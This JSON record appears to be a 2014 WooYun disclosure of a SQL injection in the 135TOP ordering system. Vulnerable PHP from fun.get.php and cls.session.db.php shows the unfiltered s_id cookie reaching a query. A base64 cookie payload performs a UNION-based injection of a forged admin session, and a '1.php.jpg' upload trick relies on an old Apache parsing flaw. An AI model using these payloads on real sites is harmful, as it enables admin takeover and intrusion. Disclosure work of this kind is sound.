{"id": 53519, "wybug_id": "wooyun-2014-067412", "wybug_title": "135订餐系统sql注入引发任意用户登录，可登录后台（无视GPC）", "wybug_corp": "135TOP网上订餐系统", "wybug_author": "兔子xss", "wybug_date": "2014-07-11 12:15", "wybug_open_date": "2014-08-25 12:16", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-11：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-08-25：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 一处sql注入引发的............ 详细说明：  I:sql注入fun.get.php文件\nstatic function safecode($msg_val,$msg_type=\"encode\"){....$str_right = base64_encode(substr($str_md5_key , -$lng_2_key2));if($msg_type == \"encode\"){\t\t\t$str_en_id   = base64_encode($msg_val);\t\t\t$str_en_code = $str_left . $str_en_id . $str_right;\t\t\t$str_return  = str_replace(\"=\" , \"\" , $str_en_code);\t\t}else{\t\t\t$str_left    = str_replace(\"=\" , \"\" , $str_left);\t\t\t$str_right   = str_replace(\"=\" , \"\" , $str_right);\t\t\t$str_llen    = strlen($str_left);\t\t\t$str_rlen    = strlen($str_right);\t\t\t$str_len     = strlen($msg_val);\t\t\tif($str_len < ($str_llen + $str_rlen)){\t\t\t\t$str_return = \"\";\t\t\t}else{\t\t\t\t$str_return = base64_decode(substr($msg_val , $str_llen , -$str_rlen));//此处只是做了一次base64的解码操作，没做过滤\t\t\t}\t\t}}\ncls.session.db.php文件：\n$str_sid = $this->get_cookie(\"s_id\");if(!empty($str_sid)) {$str_sid = fun_get::safecode($str_sid,\"decode\");//解码，没做过滤\t\t\t$str_sql = \"select * from \" . cls_config::DB_PRE . \"sys_session where session_id='\" . $str_sid . \"'\";//直接带入sql语句中\nII、管理员用户登录更加深入利用，这里的sql执行查询的是session记录，可以通过伪造参数，达到admin登录。s_sid这个cookie保存格式： 前缀+base64(sessionid)+后缀接下来先确认前缀和后缀的内容是什么：      sessionid首先有一个特点是 ip地址+XXXXXXX      这样就能确定base64(sessionid)的前几位是固定不变的，且我们可以获取自己获取得到。利用这个方式可以确定cookie的前缀。       而base64(sessionid）的后几位是动态变化的，所以后缀也能得到。这样中间的内容就是需要注入的代码的base64 \n\ncookie中间的利用POC（两侧需要加上真实的前缀和后缀）:JyB1bmlvbiBzZWxlY3QgMSwyLDMsJ2E6Mjp7czoyOiJpZCI7czoyODoiMTkyLjE2OC4xNTIuMjE5MTQwMDQ4NjIyNzc4MyI7czoxMDoibG9naW5fdXNlciI7YToxNDp7czozOiJ1aWQiO3M6MToiMSI7czo1OiJ1bmFtZSI7czo1OiJhZG1pbiI7czo0OiJuYW1lIjtzOjU6ImFkbWluIjtzOjg6Imdyb3VwX2lkIjtzOjE6IjAiO3M6OToiZGVwYXJ0X2lkIjtzOjE6IjAiO3M6NDoidHlwZSI7czo3OiJkZWZhdWx0IjtzOjc6InZlcnNpb24iO3M6MDoiIjtzOjM6InNpZCI7czoyODoiMTkyLjE2OC4xNTIuMjE5MTQwMDQ4NjIyNzc4MyI7czoxMzoibGFzdGxvZ2ludGltZSI7czoxOToiMjAxNC0wNS0xOSAxNjoxMDo0NyI7czo3OiJzaG9wX2lkIjtpOjA7czoxMDoidmVyaWZ5X3RlbCI7czoxOiIwIjtzOjEyOiJ2ZXJpZnlfZW1haWwiO3M6MToiMCI7czo1OiJzY29yZSI7aTowO3M6MTA6ImV4cGVyaWVuY2UiO2k6MTt9fScsNSw2IwIII、上传后台菜单处上传过滤不完全，可以直接上传1.php.jpg文件到后台。在apache低版本的情况下出现文件解析漏洞，</code>   漏洞证明：  \n\n\n\n   修复方案：     版权声明：转载请注明来源 兔子xss@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}